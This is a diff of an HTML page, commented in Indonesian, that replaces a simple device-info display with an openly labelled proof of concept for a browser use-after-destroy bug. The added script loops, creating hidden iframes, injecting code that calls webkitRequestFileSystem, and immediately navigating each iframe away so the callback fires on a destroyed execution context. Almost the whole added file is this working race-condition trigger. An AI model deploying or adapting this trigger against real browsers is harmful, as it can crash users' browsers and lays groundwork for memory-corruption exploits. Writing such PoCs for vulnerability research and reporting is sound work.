@@ -1,47 +1,121 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Info Perangkat dan FileSystem</title>
+    <meta charset="UTF-8">
+    <title>FileSystem Use-After-Destroy PoC</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #f0f0f0; }
+        #log { background: #000; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; border: 1px solid #333; }
+        .status { color: yellow; font-weight: bold; }
+        .error { color: red; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+    </style>
 </head>
 <body>
-  <h1>Info Perangkat</h1>
-  <pre id="info"></pre>
 
-  <script>
-    const info = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      vendor: navigator.vendor,
-      cookieEnabled: navigator.cookieEnabled,
-    };
+    <h1>FileSystem Callback Lifecycle Bug Trigger</h1>
+    <p>Mencoba memicu <code>DidOpenFileSystem</code> setelah <code>ExecutionContext</code> hancur.</p>
+    
+    <button onclick="startFuzzing()">Mulai Stress Test (Race Condition)</button>
+    <button onclick="stopFuzzing()" style="background:#ccc;">Stop</button>
+    
+    <div id="log"></div>
 
-    document.getElementById("info").textContent = JSON.stringify(info, null, 2);
+    <script>
+        let isRunning = false;
+        let iteration = 0;
+        const logDiv = document.getElementById('log');
 
-    // Cek dukungan webkitRequestFileSystem
-    if (window.webkitRequestFileSystem) {
-      window.webkitRequestFileSystem(
-        window.TEMPORARY,
-        1024 * 1024,
-        function(fs) {
-          fs.root.getFile("device_info.txt", { create: true }, function(fileEntry) {
-            fileEntry.createWriter(function(fileWriter) {
-              const blob = new Blob([JSON.stringify(info, null, 2)], { type: "text/plain" });
-              fileWriter.write(blob);
-
-              console.log("File device_info.txt berhasil ditulis.");
-            }, function(err) {
-              console.error("Gagal menulis file:", err);
-            });
-          });
-        },
-        function(err) {
-          console.error("Gagal membuat file system:", err);
+        function log(msg, type = '') {
+            const div = document.createElement('div');
+            div.textContent = `[${iteration}] ${msg}`;
+            if (type) div.className = type;
+            logDiv.appendChild(div);
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
-      );
-    } else {
-      console.warn("webkitRequestFileSystem tidak didukung di browser ini.");
-    }
-  </script>
+
+        // Langkah 1: Minta Quota dulu agar API benar-benar melakukan kerja (IPC)
+        async function requestQuota() {
+            return new Promise((resolve) => {
+                if (navigator.webkitPersistentStorage) {
+                    navigator.webkitPersistentStorage.requestQuota(10 * 1024 * 1024, resolve);
+                } else {
+                    // Fallback untuk browser modern yang mungkin sudah menghapus API ini
+                    resolve(0); 
+                }
+            });
+        }
+
+        async function startFuzzing() {
+            if (isRunning) return;
+            isRunning = true;
+            iteration = 0;
+            log("Meminta Quota Storage...", "status");
+            
+            await requestQuota();
+            log("Quota didapat. Memulai loop race condition...", "status");
+
+            while (isRunning) {
+                iteration++;
+                triggerRace();
+                
+                // Delay sangat kecil untuk membiarkan event loop berdenyut tapi tetap cepat
+                await new Promise(r => setTimeout(r, 0)); 
+            }
+        }
+
+        function stopFuzzing() {
+            isRunning = false;
+            log("Dihentikan.", "error");
+        }
+
+        function triggerRace() {
+            // 1. Buat iframe baru (ExecutionContext baru)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            const win = iframe.contentWindow;
+            const doc = iframe.contentDocument;
+
+            // 2. Inject script ke dalam iframe untuk memanggil API FileSystem
+            // Kita menggunakan string function agar scope-nya terisolasi di iframe
+            const scriptCode = `
+                (function() {
+                    try {
+                        // Ini akan memanggil FileSystemCallbacks::DidOpenFileSystem secara async
+                        window.webkitRequestFileSystem(window.TEMPORARY, 1024, 
+                            function success(fs) {
+                                // JIKA BUG TERJADI:
+                                // Callback ini dipanggil setelah context hancur.
+                                // Akses ke 'fs' atau pembuatan wrapper V8 bisa crash.
+                                console.log("Callback fired on dead context!"); 
+                            }, 
+                            function error(e) {
+                                // Ignore errors
+                            }
+                        );
+                    } catch(e) {}
+                })();
+            `;
+
+            // 3. Eksekusi script di dalam iframe
+            const scriptEl = doc.createElement('script');
+            scriptEl.textContent = scriptCode;
+            doc.body.appendChild(scriptEl);
+
+            // 4. THE KILL SWITCH: Hancurkan ExecutionContext SEGERA
+            // Kita melakukan navigasi ke about:blank atau menghapus iframe.
+            // Ini memicu teardown ExecutionContext di Blink.
+            
+            // Opsi A: Navigasi (Lebih agresif untuk teardown context)
+            iframe.src = 'about:blank';
+            
+            // Opsi B: Hapus dari DOM (Terkadang context masih hidup sebentar karena GC)
+            // document.body.removeChild(iframe); 
+
+            log(`Triggered #${iteration} - Context Destroyed`);
+        }
+    </script>
 </body>
 </html>
